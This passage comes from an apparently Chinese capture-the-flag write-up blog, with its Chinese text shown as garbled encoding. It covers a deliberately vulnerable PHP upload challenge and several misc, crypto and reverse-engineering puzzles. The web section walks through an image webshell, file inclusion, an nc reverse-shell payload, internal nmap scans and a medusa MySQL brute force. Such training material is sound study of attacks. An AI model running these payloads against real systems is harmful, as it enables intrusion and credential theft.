class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">        $image_type = exif_imagetype($filename);</span><br><span class="line">        <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">            <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (isImage($temp_file)) &#123;</span><br><span class="line">            $name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">            $ext = substr(strrchr($name, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/ph|htaccess/i"</span>, $ext)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"illegal suffix!"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">                $fn = md5(time());</span><br><span class="line">                $dir = <span class="string">'uploads/'</span>.md5($ip);</span><br><span class="line">                <span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">                    mkdir($dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $img_path = $dir.<span class="string">'/'</span>.$fn.<span class="string">'.'</span>.$ext;</span><br><span class="line">                <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                    $is_upload = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ($is_upload) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" alt="Image"/&gt;'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'not image!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">"/view.php?article=wind.php"</span>&gt;å¤å¤©çš„é£&lt;/a&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;a href=<span class="string">"/view.php?article=song.php"</span>&gt;æ­ŒÂ·é¢‚&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>ban äº† <code>htaccess</code> å’Œ <code>ph</code> åç¼€çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¹¶ä¸”ç”¨ <code>exif_imagetype</code> æ£€æµ‹æ˜¯å¦æ˜¯å›¾ç‰‡ï¼Œçœ‹æ ·å­åªèƒ½ä¸Šä¼ å›¾ç‰‡ã€‚å†™å…¥ <code>phpinfo()</code> åˆ©ç”¨æ–‡ä»¶åŒ…å«å‘ç°å¯ä»¥æ‰§è¡Œ</p>
<p><code>http://47.110.130.169:10001/view.php?article=å›¾ç‰‡è·¯å¾„</code></p>
<p>å¯ä»¥ç›´æ¥åœ¨å›¾ç‰‡æœ«å°¾å†™ä¸ªé©¬ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å‘½ä»¤åˆ¶ä½œå›¾ç‰‡é©¬ï¼š<code>copy shell.jpg /b + shell.php /a realshell.jpg</code></p>
<p>è¿™äº›åœ¨ä¹‹å‰çš„ç›´æ’­åŸ¹è®­ä¸­éƒ½æœ‰è¯´åˆ°ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨èšå‰‘è¿æ¥æˆ–è€…åå¼¹shelléƒ½å¯ä»¥</p>
<p>èšå‰‘æ–¹æ³•ï¼š</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601011824.png" alt="image-20200601011824402"></p>
<p>åœ¨æ ¹ç›®å½•æ‰¾ä¸åˆ° <code>flag</code>ï¼Œä½†æ˜¯å‘ç°æœ‰ä¸€ä¸ª <code>hint.txt</code></p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601004446.png" alt="image-20200601004446767"></p>
<p>é¢„æœŸè§£æ˜¯åå¼¹shellï¼Œç›‘å¬ <code>nc -lvp port</code>ï¼Œå†™å…¥é©¬ <code>&lt;?php exec(&quot;nc ip port -e /bin/bash&quot;); ?&gt;</code> ï¼ŒåŒ…å«äº†ä¹‹åå¯ä»¥å‘ç°å¼¹åˆ°äº†shellã€‚</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153521.png" alt="image-20200526153521836"></p>
<p>ls ä¸€ä¸‹å¯ä»¥çœ‹åˆ°å½“å‰çš„ç›®å½•ï¼Œæˆ‘ä»¬å»æ‰¾ä¸€ä¸‹ <code>/flag</code>ï¼Œå½“ç„¶æ‰¾ä¸åˆ°ï¼Œå› ä¸ºä¸åœ¨è¿™ä¸ªæœåŠ¡å™¨ä¸Šï¼Œä½†æ˜¯å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª <code>hint.txt</code> </p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601004417.png" alt="image-20200601004417726"></p>
<p>flag ä¸åœ¨è¿™å°æœåŠ¡å™¨ï¼Œçœ‹æ ·å­æ¥ä¸‹æ¥å°±æ˜¯å†…ç½‘æ¢æµ‹äº†ï¼Œæˆ‘ä»¬ <code>route -n</code> å¯ä»¥çœ‹ä¸€ä¸‹ç›®å‰çš„ç½‘å…³ã€‚</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153541.png" alt="image-20200526153541496"></p>
<p>ç”¨ <code>ifconfig</code> å¯ä»¥çœ‹åˆ°å½“å‰ä¸»æœºçš„ç½‘ç»œ</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153553.png" alt="image-20200526153553563"></p>
<p><code>hint.txt</code> å·²ç»è¯´äº†å–„ç”¨å·¥å…·ï¼Œä¸”é¢˜ç›®éå¸¸è´´å¿ƒåœ°å®‰è£…äº† <code>nmap</code>ï¼Œäºæ˜¯ <code>nmap -sP 192.168.1.0/24</code> æ‰«æå†…ç½‘å­˜æ´»ä¸»æœºï¼Œå‘ç° ip ä¸º <code>192.168.1.123</code> çš„å­˜æ´»ä¸»æœºï¼Œå› æ­¤é‚£å°±æ˜¯ä¸‹ä¸€æ­¥éœ€è¦çš„æçš„æœºã€‚</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153648.png" alt="image-20200526153648330"></p>
<p><code>curl 192.168.1.123</code> å’Œ <code>curl 192.168.1.110</code> å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œå½“ç„¶å› ä¸ºæ²¡æœ‰å¼€ http æœåŠ¡ï¼Œæˆ‘ä»¬å…ˆæ‰«æä¸€ä¸‹çœ‹çœ‹å¼€æ”¾äº†ä»€ä¹ˆç«¯å£ï¼Œç”¨ <code>nmap -p 1-65535 192.168.1.123</code>  <code>nmap -p 1-65535 192.168.1.110</code>æ¥æ‰«æå…¨éƒ¨ç«¯å£ï¼Œå‘ç°å¾ˆè´´å¿ƒåœ°åªå¼€äº†ä¸€ä¸ª <code>9997</code> ç«¯å£ï¼Œé‚£åªæœ‰æ˜¯å®ƒäº†ã€‚</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153827.png" alt="image-20200526153827321"></p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153806.png" alt="image-20200526153805961"></p>
<p>ç›´æ¥ <code>nc 192.168.1.123 9997</code>  è¿ä¸Šå»ï¼Œå‘ç°è´´å¿ƒåœ°æé†’äº†è¦ä»¥ admin ç™»é™†ï¼Œæˆ‘ä»¬æ²¡æœ‰å¯†ç ï¼Œå¦ä¸€ä¸ªæœåŠ¡å™¨è´´å¿ƒåœ°åˆšå¥½å¼€äº† mysqlï¼Œé‚£ä¸éš¾æƒ³åˆ°ç”¨æˆ·åå¯†ç åœ¨æ•°æ®åº“é‡Œé¢ï¼Œå› æ­¤æˆ‘ä»¬å°è¯•çˆ†ç ´ä¸€ä¸‹<code>mysql</code> å¯†ç ï¼Œè¿™é‡Œæ²¡æœ‰æä¾›å­—å…¸ï¼Œå› æ­¤éœ€è¦è‡ªå·±æƒ³åŠæ³•æŠŠå­—å…¸æè¿›å»ï¼Œå¯ä»¥å°†å­—å…¸æ”¾åœ¨è‡ªå·±æœåŠ¡å™¨ï¼Œç„¶åç”¨ <code>wget</code> æˆ–è€… <code>curl</code>æŠŠå­—å…¸å¸¦è¿›å»ï¼Œå½“ç„¶èšå‰‘ç­‰å·¥å…·ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚è¿™é‡Œåˆè´´å¿ƒåœ°è£…äº† <code>Medusa</code>ï¼Œçˆ†ç ´ mysql çš„è½¯ä»¶å¸¸ç”¨æ˜¯ <code>hydra</code> å’Œ <code>medusa</code> ï¼Œç™¾åº¦ä¸€ä¸‹å°±çŸ¥é“äº†ï¼Œæ²¡æœ‰è£…<code>hydra</code>ï¼Œé‚£ç”¨ <code>medusa</code>ï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.1.110 -u wust -P wordlists.txt -M mysql</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154141.png" alt="image-20200526154141877"></p>
<p>çˆ†å‡ºäº†å¯†ç  <code>iloveyou</code>ï¼Œè¿™é‡Œä¹Ÿå®‰è£…å¥½äº† <code>mysql-client</code>ï¼Œå‘½ä»¤è¿œç¨‹ç™»é™†ï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -uwust -p -h 192.168.1.110</span><br><span class="line">mysql -uwust -piloveyou -h 192.168.1.110</span><br></pre></td></tr></table></figure>

<p>æˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™å‡ºç°åå¼¹ shell çš„æ—¶å€™è¿›è¡Œ mysql äº¤äº’æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œå…¶å®è¿™ä¸ªç‚¹æœ‰ç‚¹æ„å¤–ï¼Œä¸€å¼€å§‹ debug äº†å¥½ä¹…ï¼Œå·®ç‚¹è¦æ”¹é¢˜ç›®äº†ï¼Œä½†æ˜¯åæ¥å‘ç°è¿˜æ˜¯å¯ä»¥åšçš„ï¼Œå¯ä»¥ç”¨ <code>mysql -uwust -piloveyou -h 192.168.1.110</code> è¿ä¸Šå»åï¼Œç›´æ¥å¼€å§‹æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œç„¶åè¾“å…¥ä¸€ä¸ªé”™è¯¯çš„è¯­å¥ï¼ŒæŠ¥é”™åå°±ä¼šè¾“å‡ºåŸæœ¬çš„ä¿¡æ¯äº†ï¼ŒåŸå› åº”è¯¥æ˜¯å›æ˜¾åˆ°ç¼“å†²åŒºäº†ï¼ŒæŠ¥é”™æ–­å¼€ä¼šè¯åå°±ä¼šæ˜¾ç¤ºä¿¡æ¯.</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133324.png" alt="image-20200531133317526"></p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133343.png" alt="image-20200531133343348"></p>
<p>å½“ç„¶å¦‚æœä½ é€‰æ‹©ç”¨å·¥å…·è¿ä¸Šå»ï¼Œèšå‰‘<strong>ç»ˆç«¯</strong>æ˜¯ä¸èƒ½åˆ›å»º mysqlï¼Œssh ç­‰äº¤äº’å¼ä¼šè¯çš„ï¼Œç”¨æ•°æ®åº“çš„æ¨¡å—ï¼š</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133952.png" alt="image-20200531133952593"></p>
<p>ä¹Ÿå¯ä»¥å°è¯•å†°èï¼Œä¸€å¥—æ“ä½œéƒ½å†™å¥½äº†ã€‚</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200529234531.png" alt="image-20200529234530994"></p>
<p>ä¹Ÿå¯ä»¥ç”¨æ•°æ®åº“ç®¡ç†å·¥å…·æŒ‚ä¸ªä»£ç†å°±è¿ä¸Šå»ï¼Œ<code>navicat</code> æˆ–è€… <code>sqllog</code> éƒ½å¯ä»¥ç›´æ¥æŸ¥åº“ã€‚</p>
<p>æŸ¥æ•°æ®åº“ï¼š</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154351.png" alt="image-20200526154351359"></p>
<p>æŸ¥è¡¨ï¼š</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154417.png" alt="image-20200526154417752"></p>
<p>ç„¶åç›´æ¥æŸ¥ç”¨æˆ·å°±å¯ä»¥äº†</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200529235205.png" alt="image-20200529235205910"></p>
<p>å°±ä¸‰ä¸ªï¼Œæ‰¾åˆ°å¯¹çš„ä¸€ä¸ªå›å»ç™»é™†åå‘ç°æœ‰ä¸€è¡Œå­—ï¼š</p>
<p><code>You take my shell, but my port is closed, my network is closed, everything is closed.</code></p>
<p>æç¤ºäº† <code>closed</code>ï¼Œæ— è®ºæ€ä¹ˆè¾“å…¥éƒ½æ²¡æœ‰å›æ˜¾ï¼Œä¹Ÿå°±å…³é—­äº†æ ‡å‡†è¾“å‡ºï¼Œæ‰€ä»¥éœ€è¦èµ„æºé‡å®šå‘ã€‚</p>
<p>æç¤ºä¹Ÿç»™å‡ºäº†æºç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">close</span>(<span class="number">1</span>); </span><br><span class="line"><span class="built_in">close</span>(<span class="number">2</span>); </span><br><span class="line"><span class="keyword">return</span> shell(); </span><br><span class="line"><span class="comment">//è¾“å‡ºé‡å®šå‘</span></span><br></pre></td></tr></table></figure>

<p>è€å¥—è·¯ï¼Œç™¾åº¦å°±æœ‰ï¼Œç†è§£ä¸€ä¸‹å°±å¯ä»¥åšäº†ï¼Œä¹Ÿå¯ä»¥å‚è€ƒæ ¡èµ› <code>pwn é¢˜ closed</code> çš„ <code>payload</code>ï¼Œ ä¸€æ‰“å°±è¡Œ</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh 1&gt;&amp;0</span><br><span class="line"><span class="comment">#è¿™ä¸ªç‚¹ä¸ç®—pwnçš„çŸ¥è¯†ï¼Œæ˜¯æ“ä½œç³»ç»ŸåŸºæœ¬çŸ¥è¯†ï¼ŒåŸç†è¿˜æ˜¯å¾—äº†è§£ä¸€ä¸‹</span></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®è¯´æ˜ <code>flag</code> åœ¨ <code>/flag</code>ï¼Œç›´æ¥è¯»å–å³å¯ï¼š</p>
<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154632.png" alt="image-20200526154632416"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="è¿˜æ˜¯å†™é¢˜çˆ½"><a href="#è¿˜æ˜¯å†™é¢˜çˆ½" class="headerlink" title="è¿˜æ˜¯å†™é¢˜çˆ½"></a>è¿˜æ˜¯å†™é¢˜çˆ½</h3><p>å‡ºé¢˜äºº: 0bs3rver</p>
<p>å…¶å®å‡ºé¢˜æƒ³æ³•æ˜¯å‡ºé¢˜ç›®å¥½éº»çƒ¦å•Šï½</p>
<p>å†™å†™é¢˜ï¼Œå†™ä¸å‡ºæ¥å°±å»çœ‹WPï¼Œå«–ä¸€æ³¢çŸ¥è¯†ï¼Œå¤šçˆ½å•Šï¼Œå“</p>
<p>æ‹¿åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ‰“å¼€æ˜¯ä¸€ä¸ªå¸¦å¯†ç çš„flag.7zå’Œpasswordæ–‡æ¡£ï¼Œæ ¹æ®é¢˜ç›®æè¿°WTFæƒ³åˆ°Brainfuckå¯†ç ï¼ˆä¸€ç‚¹ç‚¹è„‘æ´ï¼‰ï¼Œæ‹¿åˆ°è¿™é‡Œè§£å¼€<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p>
<p>å¾—åˆ°å¯†ç ï¼Œè§£å¼€å¯å¾—ä¸€ä¸ªäºŒç»´ç ï¼Œä½†æ˜¯å®šä½å—è¢«æˆ‘æ‰£æ‰äº†ï¼Œè¡¥ä¸Šå»ä¸€æ‰«å³å¯get flagã€‚</p>
<p>flag{chu_ti_hao_ma_fan}</p>
<h3 id="Cry"><a href="#Cry" class="headerlink" title="Cry"></a>Cry</h3><p>â€‹        æ˜¯ä¸€ä¸ªæ°ç‘ç¬‘å“­çš„è¡¨æƒ…åŒ…ã€‚ã€‚ã€‚</p>
<p>â€‹        æŸ¥çœ‹å±æ€§ï¼Œæ²¡å•¥å‘ç°ã€‚</p>
<p>â€‹        ä¸¢è¿›Winhexæˆ–è€…idaè¿›è¡ŒäºŒè¿›åˆ¶åˆ†æã€‚</p>
<p><img src="https://s1.ax1x.com/2020/06/01/t8saZV.png" alt="t8saZV.png"></p>
<p>â€‹        æ‹‰åˆ°æœ€åå‘ç°flagï¼š</p>
<p><img src="https://s1.ax1x.com/2020/06/01/t8sdaT.png" alt="t8sdaT.png"></p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Are-u-okï¼Ÿ"><a href="#Are-u-okï¼Ÿ" class="headerlink" title="Are u okï¼Ÿ"></a>Are u okï¼Ÿ</h3><p>å‡ºé¢˜äºº: 0bs3rver</p>
<p>åŒæ‹¿åˆ°å‹ç¼©åŒ…ï¼Œæ‰“å¼€æ˜¯passwordæ–‡æ¡£å’Œå¸¦å¯†ç å‹ç¼©åŒ…ï¼Œæ‰“å¼€æ–‡æ¡£ä¸€çœ‹å¸¦=å·ï¼Œä½†å…¶å®å¹¶ä¸æ˜¯base64ï¼Œè€ƒè™‘åˆ°æ˜¯å¯†ç å­¦åˆ†ç±»ï¼Œå¯èƒ½æ˜¯ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„åŠ å¯†</p>
<p>éœ€è¦å°è¯•ä¸€æ³¢ï¼Œä½¿ç”¨çš„æ˜¯AESï¼Œå¯†é’¥æ˜¯é¢˜ç›®æè¿°ï¼šnobody is ok.</p>
<p>å³å¯å¾—åˆ°å¯†ç ï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œåˆæ˜¯ä¹±ä¸ƒå…«ç³Ÿçš„ç©æ„ï¼Œä¸€å¤§å †Ookï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯è¿™ä¸ªåŠ å¯†ï¼ŒåŒæ ·çš„åœ¨çº¿ç½‘ç«™è§£å¼€ï¼Œ<a href="https://www.splitbrain.org/services/ookï¼Œå³å¯get" target="_blank" rel="noopener">https://www.splitbrain.org/services/ookï¼Œå³å¯get</a> flagã€‚</p>
<p>flag{Iâ€™m not ok, ok?}</p>
<h3 id="be-r"><a href="#be-r" class="headerlink" title="be@r"></a>be@r</h3><p>â€‹        ç”±ç†Šå¤§æ›°å¯ä»¥å¯ä»¥çœ‹å‡ºæ¥æ˜¯ä¸ç†Šè®ºé“ç¼–ç ï¼Œé€šè¿‡<a href="http://hi.pcmoe.net/index.html" target="_blank" rel="noopener">åœ¨çº¿è§£ç </a></p>
<p>â€‹        å°†ç†Šå¤§æ›°æ”¹ä¸ºç†Šæ›°ï¼Œè§£ç å¾—åˆ°flag</p>
<p><img src="https://s1.ax1x.com/2020/06/01/t8sDG4.png" alt="t8sDG4.png"></p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p>æ ¹æ®é¢˜ç›®åå’Œé¢˜ç›®æè¿°å¯ä»¥çŒœåˆ°æ˜¯è¿·å®«ç±»é€†å‘</p>
<p>æ¯”è¾ƒå›°éš¾çš„åœ°æ–¹å¯èƒ½æ˜¯c++ï¼Œè¿™ç©æ„idaæ‰“å¼€æŒºéš¾çœ‹çš„</p>
<p>ç¨‹åºé€»è¾‘æ˜¯æ ¹æ®è¾“å…¥åœ¨8*8çš„æ–¹å—å†…è¿›è¡Œç§»åŠ¨ï¼Œä¸€æ—¦ç§»åŠ¨åˆ° â€˜Zâ€™ ä½ç½®å°±é”™äº†ï¼Œè€Œä¸”æœ€åéœ€è¦ç§»åŠ¨åˆ° â€˜Wâ€™ ä½ç½®ï¼Œä¸€å…±èƒ½ç§»åŠ¨åäº”æ¬¡ï¼Œåªæœ‰ä¸€æ¡é“è·¯å¯ä»¥è¿›è¡Œé€‰æ‹©ï¼ŒWSADåˆ†åˆ«æ§åˆ¶ä¸Šä¸‹å·¦å³ï¼Œè¾“å…¥å°±æ˜¯flag</p>
<p>é™„ä¸ªæºç </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">64</span>] = &#123;</span><br><span class="line">  <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'W'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> a1=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move</span><span class="params">(<span class="keyword">char</span> m)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Please input your flag:"</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; c;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">move</span>(c[i]) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Wrong flag!"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">move</span>(c[<span class="number">14</span>]);</span><br><span class="line">    <span class="keyword">if</span>(a[a1] != <span class="string">'W'</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Wrong flag!"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Wow, you get right flag!"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move</span><span class="params">(<span class="keyword">char</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (m) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'W'</span>:</span><br><span class="line">            a1 -= <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'A'</span>:</span><br><span class="line">            a1--;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">            a1 += <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">            a1++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a1&gt;<span class="number">0</span> &amp;&amp; a1&lt;<span class="number">63</span>)</span><br><span class="line">        <span class="keyword">if</span>(a[a1] == <span class="string">'P'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag{DSSDSSSDDWWDDDS}</p>
<h3 id="ezbabyre"><a href="#ezbabyre" class="headerlink" title="ezbabyre"></a>ezbabyre</h3><p>æ‹¿åˆ°ç¨‹åºé¦–å…ˆè¯•ç€è¿è¡Œä¸€æ³¢ï¼Œä¼šè®©ä½ è§£ä¸‰ä¸ªæ•°å­¦ (?) é—®é¢˜ï¼Œä½†æ˜¯è§£å¼€å¹¶æ²¡æœ‰flagï¼ˆç¬‘</p>
